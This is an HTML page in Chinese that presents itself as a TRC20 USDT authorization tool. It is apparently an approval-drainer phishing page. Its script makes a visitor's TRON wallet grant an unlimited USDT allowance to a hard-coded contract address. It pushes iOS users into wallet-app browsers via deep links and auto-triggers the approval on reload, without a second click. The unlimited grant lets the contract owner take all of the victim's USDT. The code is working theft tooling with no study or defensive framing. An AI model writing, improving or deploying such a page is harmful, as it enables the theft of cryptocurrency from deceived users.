<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TRC20 USDT 无限授权</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.8.0/dist/TronWeb.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        body {
            background-color: #f5f7fa;
            min-height: 100vh;
            padding: 30px 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .auth-container {
            width: 100%;
            max-width: 450px;
            background: #fff;
            border-radius: 18px;
            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.06);
            padding: 35px 25px;
            text-align: center;
        }
        .auth-title {
            font-size: 22px;
            color: #333;
            margin-bottom: 35px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .auth-title i {
            color: #409eff;
            font-size: 24px;
        }
        #approveBtn {
            width: 100%;
            padding: 18px 20px;
            background-color: #409eff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: background-color 0.2s ease;
        }
        #approveBtn:hover {
            background-color: #3086e8;
        }
        #approveBtn i {
            font-size: 20px;
        }
        #log {
            margin-top: 25px;
            padding: 16px;
            background-color: #f9fafc;
            border: 1px solid #eef2f7;
            border-radius: 10px;
            font-size: 15px;
            color: #666;
            min-height: 70px;
            display: flex;
            align-items: center;
            justify-content: center;
            line-height: 1.6;
            flex-direction: column;
        }
        #log .wallet-btn-group {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            width: 100%;
            margin: 10px 0;
        }
        #log button {
            flex: 1;
            min-width: 120px;
            height: 44px;
            line-height: 44px;
            font-size: 15px;
            background: #409eff;
            color: #fff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
        #log .tips-text {
            line-height: 1.8;
            color: #666;
            font-size: 14px;
            width: 100%;
            text-align: center;
        }
        .contract-tip {
            margin-top: 18px;
            font-size: 13px;
            color: #999;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <!-- 修复：删除多余的“<<”符号，避免图标渲染错乱 -->
        <h2 class="auth-title">
            <<i class="fa-solid fa-key"></</i> TRC20 USDT 无限授权
        </h2>
        <!-- 修复：删除按钮内多余的“<<”符号 -->
        <button id="approveBtn">
            <<i class="fa-solid fa-shield-halved"></</i> 授权 USDT 到目标合约
        </button>
        <div id="log">点击按钮，发起授权</div>
        <div class="contract-tip">
            目标合约：TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa
        </div>
    </div>

    <script>
        const TARGET = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa";
        const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const btn = document.getElementById("approveBtn");
        const log = document.getElementById("log");

        // 保留：标准TRC20无限授权额度（2^256 - 1），兼容所有钱包
        const APPROVE_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        // 保留：优化后的钱包Scheme，直接跳转浏览器模块
        const IOS_WALLET_SCHEMES = {
            imToken: "imtoken://browser?url=" + encodeURIComponent(window.location.href + "?t=" + new Date().getTime()),
            TrustWallet: "trust://open_url?url=" + encodeURIComponent(window.location.href + "?t=" + new Date().getTime()),
            MathWallet: "mathwallet://openurl?url=" + encodeURIComponent(window.location.href + "?t=" + new Date().getTime())
        };

        // 保留：跳转超时检测逻辑
        function checkWalletJump(walletName) {
            const startTime = Date.now();
            const checkTimer = setInterval(() => {
                if (document.hidden || document.visibilityState === "hidden") {
                    clearInterval(checkTimer);
                    return;
                }
                if (Date.now() - startTime > 3000) {
                    clearInterval(checkTimer);
                    log.innerHTML = `
                        <div class="tips-text">未检测到跳转，请手动操作：</div>
                        <div class="tips-text">1. 打开手机「${walletName}」APP</div>
                        <div class="tips-text">2. 点击底部「浏览器」图标</div>
                        <div class="tips-text">3. 地址栏自动填充链接，点击确认即可</div>
                    `;
                }
            }, 500);
        }

        // 修复：中文函数名兼容性问题，改为英文函数名
        function openWallet(walletName) {
            const schemeUrl = IOS_WALLET_SCHEMES[walletName];
            window.location.href = schemeUrl;
            checkWalletJump(walletName);
        }

        // 优化：增加钱包加载后自动触发授权（无需二次点击）
        async function handleApprove(autoTrigger = false) {
            try {
                if (!window.tronWeb || !window.tronWeb.ready) {
                    log.textContent = "请先唤起钱包并加载页面";
                    return;
                }
                // 自动触发时提示更精准
                const tipText = autoTrigger ? "已进入授权流程，等待钱包确认..." : "授权中...请在钱包确认";
                log.textContent = tipText;

                const usdtContract = await window.tronWeb.contract().at(USDT);
                const tx = await usdtContract.approve(
                    TARGET, 
                    APPROVE_AMOUNT,
                    { from: window.tronWeb.defaultAddress.base58, feeLimit: 300000000 }
                ).send();

                log.textContent = "成功！交易ID：" + tx.txid.slice(0, 16) + "...";
            } catch (e) {
                const errMsg = e.message || "授权失败";
                log.textContent = "失败：" + errMsg.slice(0, 50);
            }
        }

        // 保留：按钮点击逻辑，适配“唤起钱包”和“直接授权”
        btn.onclick = function() {
            if (window.tronWeb && window.tronWeb.ready) {
                handleApprove();
                return;
            }

            // 同步：将中文函数名改为英文openWallet
            let walletBtns = Object.keys(IOS_WALLET_SCHEMES).map(walletName => {
                return `<button onclick="openWallet('${walletName}')">
                          唤起${walletName}（请点“允许”）
                        </button>`;
            }).join("");

            log.innerHTML = `
                <div class="wallet-btn-group">${walletBtns}</div>
                <div class="tips-text">提示：弹出“打开钱包”请选“允许”，将自动跳转浏览器</div>
                <div class="tips-text">未装钱包？去App Store搜索对应钱包</div>
            `;
        };

        // 新增：页面加载时检测，若从钱包跳转则自动触发授权
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            // 检测是否带时间戳参数（跳转后自动携带），是则自动授权
            if (urlParams.has("t")) {
                const checkTronWeb = setInterval(() => {
                    if (window.tronWeb && window.tronWeb.ready) {
                        clearInterval(checkTronWeb);
                        handleApprove(true); // 自动触发授权
                    }
                }, 300);
            }
        };
    </script>
</body>
</html>
